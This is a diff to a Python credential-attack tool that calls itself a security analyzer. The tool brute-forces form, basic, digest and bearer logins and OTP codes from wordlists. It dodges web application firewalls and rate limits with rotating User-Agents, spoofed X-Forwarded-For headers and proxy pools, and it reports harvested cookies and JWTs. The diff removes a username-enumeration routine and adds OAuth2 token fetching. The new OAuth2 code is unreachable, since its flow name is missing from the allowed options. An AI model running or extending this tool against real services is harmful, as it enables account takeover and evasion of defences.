@@ -75,7 +75,6 @@ class AdaptiveThrottler:
             if self.baseline_avg is None and len(self.response_times) >= 5:
                 self.baseline_avg = sum(self.response_times) / len(self.response_times)
 
-            # Check for rate limiting or latency spike (> 3x baseline or HTTP 429)
             if status_code == 429 or (self.baseline_avg and elapsed > self.baseline_avg * 3.0):
                 self.backoff_factor = min(self.backoff_factor * 1.5, 10.0)
                 self.current_delay = max(self.current_delay * 1.5, 0.5) * self.backoff_factor
@@ -104,10 +103,8 @@ class EvasionEngine:
             return headers_dict
         
         headers = headers_dict.copy()
-        # Rotate User-Agent
         headers["User-Agent"] = random.choice(self.user_agents)
         
-        # Inject IP spoofing headers
         spoofed_ip = self.get_random_ip()
         headers["X-Forwarded-For"] = spoofed_ip
         headers["X-Originating-IP"] = spoofed_ip
@@ -231,6 +228,34 @@ def parse_cookies(cookie_arg):
                 k, v = item.split("=", 1)
                 cookies[k.strip()] = v.strip()
     return cookies
+
+def fetch_oauth2_token(session, token_url, client_id, client_secret, scope, proxy_pool, single_proxy, base_headers, evasion_engine):
+    """Obtains an OAuth2 access token via Client Credentials grant."""
+    print(f"\n[*] Requesting OAuth2 Access Token from: {token_url}")
+    headers = evasion_engine.apply_evasion_headers(base_headers)
+    req_proxies = get_request_proxies(proxy_pool, single_proxy)
+    
+    payload = {
+        "grant_type": "client_credentials",
+        "client_id": client_id,
+        "client_secret": client_secret
+    }
+    if scope:
+        payload["scope"] = scope
+
+    try:
+        resp = session.post(token_url, data=payload, headers=headers, proxies=req_proxies, timeout=10, verify=False)
+        if resp.status_code == 200:
+            data = resp.json()
+            token = data.get("access_token")
+            token_type = data.get("token_type", "Bearer")
+            if token:
+                print(f"[+] Successfully acquired OAuth2 Access Token (Type: {token_type})")
+                return f"{token_type} {token}"
+        print(f"[-] Failed to fetch OAuth2 token. Status: {resp.status_code}, Response: {resp.text}")
+    except Exception as e:
+        print(f"[!] Error fetching OAuth2 token: {e}")
+    return None
 
 def extract_csrf_token(html_content, csrf_field_name):
     """Extracts a dynamic CSRF token from HTML using BeautifulSoup or regex fallback."""
@@ -432,108 +457,8 @@ def audit_password_policy(session, policy_url, current_pass_field, current_passw
     print("="*60)
     return policy_findings
 
-def test_user_existence(session, target_url, username, auth_type, content_type, user_field, pass_field, proxy_pool, single_proxy, base_headers, cookies, extract_csrf, csrf_field, probe_password, throttler, evasion_engine, verbose):
-    """Probes a single username with a dummy password to check for account existence via differential response analysis."""
-    headers = evasion_engine.apply_evasion_headers(base_headers)
-    req_proxies = get_request_proxies(proxy_pool, single_proxy)
-    apply_delay_sleep(throttler)
-
-    start_time = time.time()
-    try:
-        if auth_type == "form":
-            hidden_inputs = {}
-            csrf_token = None
-
-            get_resp = session.get(target_url, headers=headers, cookies=cookies, proxies=req_proxies, timeout=5, allow_redirects=True, verify=False)
-            if get_resp.status_code == 200:
-                if extract_csrf:
-                    csrf_token = extract_csrf_token(get_resp.text, csrf_field)
-                matches = re.findall(r'<input[^>]+type=["\']?hidden["\']?[^>]*>', get_resp.text, re.IGNORECASE)
-                for m in matches:
-                    name_match = re.search(r'name=["\']?([^"\']+)["\']?', m, re.IGNORECASE)
-                    val_match = re.search(r'value=["\']?([^"\']*)["\']?', m, re.IGNORECASE)
-                    if name_match:
-                        hidden_inputs[name_match.group(1)] = val_match.group(1) if val_match else ""
-
-            if csrf_token:
-                hidden_inputs[csrf_field] = csrf_token
-
-            if content_type == "json":
-                headers["Content-Type"] = "application/json"
-                payload = json.dumps({user_field: username, pass_field: probe_password, **hidden_inputs})
-                resp = session.post(target_url, data=payload, headers=headers, cookies=cookies, proxies=req_proxies, timeout=5, allow_redirects=True, verify=False)
-            else:
-                if "Content-Type" not in headers:
-                    headers["Content-Type"] = "application/x-www-form-urlencoded"
-                payload = {user_field: username, pass_field: probe_password, **hidden_inputs}
-                resp = session.post(target_url, data=payload, headers=headers, cookies=cookies, proxies=req_proxies, timeout=5, allow_redirects=True, verify=False)
-
-            elapsed = time.time() - start_time
-            status_code = resp.status_code if resp else 0
-            throttler.record_response(elapsed, status_code)
-
-            return {
-                "username": username,
-                "status_code": status_code,
-                "response_length": len(resp.content) if resp else 0,
-                "response_text": resp.text if resp else "",
-                "response_time": elapsed
-            }
-    except requests.exceptions.RequestException as e:
-        if verbose:
-            print(f"[!] Enum request exception for user {username}: {e}")
-    return None
-
-def run_user_enumeration(session, target_url, usernames, auth_type, content_type, user_field, pass_field, proxy_pool, single_proxy, base_headers, cookies, extract_csrf, csrf_field, probe_password, throttler, evasion_engine, threads, verbose):
-    """Runs differential user enumeration across all usernames in the wordlist."""
-    print("\n" + "="*60 + "\n[*] Starting Dedicated Account Enumeration Phase:")
-    print(f"    - Probing {len(usernames)} username(s) with dummy password...")
-
-    results = []
-    with ThreadPoolExecutor(max_workers=threads) as executor:
-        futures = [
-            executor.submit(
-                test_user_existence, session, target_url, user, auth_type, content_type,
-                user_field, pass_field, proxy_pool, single_proxy, base_headers, cookies,
-                extract_csrf, csrf_field, probe_password, throttler, evasion_engine, verbose
-            )
-            for user in usernames
-        ]
-        for f in as_completed(futures):
-            res = f.result()
-            if res:
-                results.append(res)
-
-    if not results:
-        print("    [-] User enumeration returned no results.")
-        print("="*60)
-        return []
-
-    lengths = [r['response_length'] for r in results]
-    length_counts = Counter(lengths)
-    baseline_length, baseline_count = length_counts.most_common(1)[0]
-
-    valid_users = []
-    print(f"    - Baseline Failure Response Length: {baseline_length} bytes ({baseline_count} occurrences)")
-
-    for r in results:
-        l = r['response_length']
-        if l != baseline_length:
-            diff = abs(l - baseline_length)
-            print(f"    [+] [POTENTIAL VALID USER] '{r['username']}' -> Length: {l}B (Diff: {diff:+d}B, Status: {r['status_code']})")
-            valid_users.append(r['username'])
-        elif verbose:
-            print(f"    [-] Checked '{r['username']}' -> Length: {l}B (Matches baseline)")
-
-    if not valid_users:
-        print("    [+] All usernames produced identical responses (strong anti-enumeration defenses).")
-    else:
-        print(f"\n[+] Enumeration Complete. Discovered {len(valid_users)} potential valid account(s).")
-    print("="*60)
-    return valid_users
-
-def test_auth(session, target_url, username, password, auth_type, content_type, user_field, pass_field, failure_keyword, success_regex, proxy_pool, single_proxy, base_headers, cookies, circuit_breaker, throttler, evasion_engine, extract_csrf=False, csrf_field="csrf_token", lockout_keyword=None, verbose=False):
-    """Handles authentication testing with optional dynamic CSRF token extraction, circuit breaker, and adaptive throttling."""
+def test_auth(session, target_url, username, password, auth_type, content_type, user_field, pass_field, failure_keyword, success_regex, proxy_pool, single_proxy, base_headers, cookies, circuit_breaker, throttler, evasion_engine, auth_flow="form", bearer_token=None, extract_csrf=False, csrf_field="csrf_token", lockout_keyword=None, verbose=False):
+    """Handles authentication testing supporting Form, Basic, Digest, Bearer, and OAuth2 token flows."""
     if circuit_breaker.is_tripped():
         return None
 
@@ -546,7 +471,17 @@ def test_auth(session, target_url, username, password, auth_type, content_type, 
     is_success = False
 
     try:
-        if auth_type == "form":
+        if auth_flow == "bearer" and bearer_token:
+            headers["Authorization"] = bearer_token if bearer_token.startswith("Bearer ") else f"Bearer {bearer_token}"
+            resp = session.get(target_url, headers=headers, cookies=cookies, proxies=req_proxies, timeout=5, verify=False)
+            elapsed = time.time() - start_time
+            status_code = resp.status_code if resp else 0
+            throttler.record_response(elapsed, status_code)
+            if status_code in [200, 201]:
+                if not success_regex or re.search(success_regex, resp.text):
+                    is_success = True
+
+        elif auth_type == "form":
             hidden_inputs = {}
             csrf_token = None
 
@@ -631,7 +566,7 @@ def test_auth(session, target_url, username, password, auth_type, content_type, 
             "username": username,
             "password": password,
             "endpoint": target_url,
-            "type": auth_type,
+            "type": auth_flow if auth_flow == "bearer" else auth_type,
             "status_code": status_code,
             "response_time": elapsed,
             "response_length": resp_length,
@@ -646,7 +581,7 @@ def test_auth(session, target_url, username, password, auth_type, content_type, 
             if is_mfa_challenge:
                 print(f"\n[+] [MFA CHALLENGE] Valid login found ({username}:{password}), but MFA verification required at {target_url}")
             else:
-                print(f"\n[+] [SUCCESS] Valid login found -> {username}:{password} at {target_url} [{auth_type.upper()}]")
+                print(f"\n[+] [SUCCESS] Valid access achieved -> {username}:{password} at {target_url} [{auth_flow.upper()}]")
             if captured_cookies:
                 print(f"    [+] Harvested Cookies: {captured_cookies}")
             if captured_headers:
@@ -654,7 +589,7 @@ def test_auth(session, target_url, username, password, auth_type, content_type, 
             if jwt_candidates:
                 print(f"    [+] Discovered JWT Tokens in Response: {len(jwt_candidates)} token(s)\n")
         elif verbose:
-            print(f"[-] Failed {auth_type} login {username}:{password} at {target_url} (Status: {status_code}, Length: {resp_length}B)")
+            print(f"[-] Failed login {username}:{password} at {target_url} (Status: {status_code}, Length: {resp_length}B)")
 
         return result
 
@@ -993,7 +928,11 @@ def run_analysis(args):
 
     session = requests.Session()
 
-    print(f"[*] Auth Type: {args.auth_type.upper()} | Content-Type: {args.content_type.upper()}")
+    bearer_token = args.bearer_token
+    if args.auth_flow == "oauth2-client-credentials" and args.token_url and args.client_id and args.client_secret:
+        bearer_token = fetch_oauth2_token(session, args.token_url, args.client_id, args.client_secret, args.oauth_scope, proxy_pool, args.proxy, base_headers, evasion_engine)
+
+    print(f"[*] Auth Flow: {args.auth_flow.upper()} | Content-Type: {args.content_type.upper()}")
     if args.adaptive_delay:
         print("[*] Adaptive Throttling & Auto-Backoff Enabled: Active latency monitoring engaged.")
     if args.evasion:
@@ -1026,7 +965,7 @@ def run_analysis(args):
                     test_auth, session, endpoint, user, pwd, args.auth_type,
                     args.content_type, args.user_field, args.pass_field, args.failure_keyword, 
                     args.success_regex, proxy_pool, args.proxy, base_headers, 
-                    cookies, circuit_breaker, throttler, evasion_engine, args.extract_csrf, args.csrf_field, 
+                    cookies, circuit_breaker, throttler, evasion_engine, args.auth_flow, bearer_token, args.extract_csrf, args.csrf_field, 
                     args.lockout_keyword, args.verbose
                 )
                 for user, pwd, endpoint in tasks
@@ -1060,6 +999,8 @@ def run_analysis(args):
                 audited_tokens.add(t)
         if args.jwt_token:
             audited_tokens.add(args.jwt_token)
+        if bearer_token:
+            audited_tokens.add(bearer_token.replace("Bearer ", ""))
 
         if audited_tokens:
             for jwt_str in audited_tokens:
@@ -1085,9 +1026,15 @@ def run_analysis(args):
     return valid_credentials, timing_vulns, length_outliers
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Advanced Security Analyzer with WAF Evasion Engine")
+    parser = argparse.ArgumentParser(description="Advanced Security Analyzer with OAuth2, Bearer, and WAF Evasion Support")
     parser.add_argument("-u", "--url", default="http://127.0.0.1:8080/login", help="Target URL")
-    parser.add_argument("--auth-type", choices=["form", "basic", "digest"], default="form", help="Authentication type to test")
+    parser.add_argument("--auth-type", choices=["form", "basic", "digest"], default="form", help="Authentication protocol type")
+    parser.add_argument("--auth-flow", choices=["form", "basic", "digest", "bearer"], default="form", help="Authentication flow mechanism")
+    parser.add_argument("--token-url", help="OAuth2 Token endpoint for client credentials grant")
+    parser.add_argument("--client-id", help="OAuth2 client ID")
+    parser.add_argument("--client-secret", help="OAuth2 client secret")
+    parser.add_argument("--oauth-scope", help="OAuth2 requested scope")
+    parser.add_argument("--bearer-token", help="Static Bearer token string to test protected APIs")
     parser.add_argument("--content-type", choices=["form", "json"], default="form", help="Payload content type for form/API auth")
     parser.add_argument("--extract-csrf", action="store_true", help="Automatically scrape and inject anti-CSRF token")
     parser.add_argument("--csrf-field", default="csrf_token", help="Name of the form/JSON field for CSRF token")
@@ -1105,7 +1052,7 @@ if __name__ == "__main__":
     parser.add_argument("--otp-field", default="otp_code", help="Form field name for the OTP/verification code")
     parser.add_argument("--otp-list", default="passwords.txt", help="Wordlist file containing candidate OTP/PIN codes")
     parser.add_argument("--policy-check", action="store_true", help="Enable automated password complexity & policy checker")
-    parser.add_argument("--policy-url", help="Target endpoint for password policy probing (e.g., /register or /change-password)")
+    parser.add_argument("--policy-url", help="Target endpoint for password policy probing")
     parser.add_argument("--policy-field", default="new_password", help="Form/JSON field name for the new password being tested")
     parser.add_argument("--current-pass-field", default="current_password", help="Form field name for current password if required")
     parser.add_argument("--current-password", help="Actual current password if required by change endpoint")
@@ -1156,7 +1103,7 @@ if __name__ == "__main__":
     if args.report:
         metadata = {
             "url": args.url,
-            "auth_type": args.auth_type,
+            "auth_type": args.auth_flow,
             "duration": duration_str
         }
         export_html_report(found, timing_vulns, length_outliers, args.report, metadata)
